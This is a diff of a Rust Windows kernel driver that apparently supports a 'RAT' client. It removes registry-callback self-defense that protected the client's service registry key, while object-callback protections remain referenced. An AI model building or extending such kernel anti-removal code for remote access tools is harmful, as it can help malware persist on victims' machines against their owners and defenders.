@@ -9,8 +9,7 @@ use rat_common::windows::kernel::KernelHandoff;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
-    CmUnRegisterCallback, KeDelayExecutionThread, ObUnRegisterCallbacks, RtlInitUnicodeString,
-    ZwClose, ZwCreateKey,
+    KeDelayExecutionThread, ObUnRegisterCallbacks, RtlInitUnicodeString, ZwClose, ZwCreateKey,
 };
 use wdk_sys::{
     HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
@@ -20,12 +19,10 @@ use wdk_sys::{
 use widestring::{U16CStr, u16cstr};
 
 use crate::global::{
-    CM_REGISTER_CALLBACK_COOKIE, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE,
-    OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT, RAT_CLIENT, RAT_CLIENT_OBJ_PATH,
-    RAT_CLIENT_OBJ_PATH_SELF_DEFENSE, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
-    RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE, SERVICE_REGISTRY_AHO_CORASICK,
+    MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK,
+    ORIGINAL_DRIVER_OBJECT, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
+    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
 };
-use crate::handlers::registry::cm_register_callback;
 use crate::handlers::{device, object};
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
@@ -187,44 +184,7 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
         }
     }
 
-    match AhoCorasickBuilder::new()
-        .ascii_case_insensitive(true)
-        .build([u16cstr_to_buf(RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE)])
-    {
-        Ok(ac) => {
-            info!("Constructed Aho-Corasick automaton for service registry");
-            let ac =
-                SERVICE_REGISTRY_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
-            if !ac.is_null() {
-                unsafe {
-                    let _ = Box::from_raw(ac);
-                }
-            }
-        }
-        Err(e) => {
-            success = false;
-            error!("Failed to build Aho-Corasick automaton for service registry: {e}");
-        }
-    }
-
     let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
-    match cm_register_callback(driver) {
-        Ok(cookie) => {
-            info!("Registered registry callbacks");
-
-            let cookie =
-                CM_REGISTER_CALLBACK_COOKIE.swap(unsafe { cookie.QuadPart }, Ordering::AcqRel);
-            if cookie != 0 {
-                unsafe {
-                    let _ = CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie });
-                }
-            }
-        }
-        Err(e) => {
-            success = false;
-            error!("Failed to register registry callbacks: {e}");
-        }
-    }
 
     match device::create_device(driver) {
         Ok(_) => info!("Created device"),
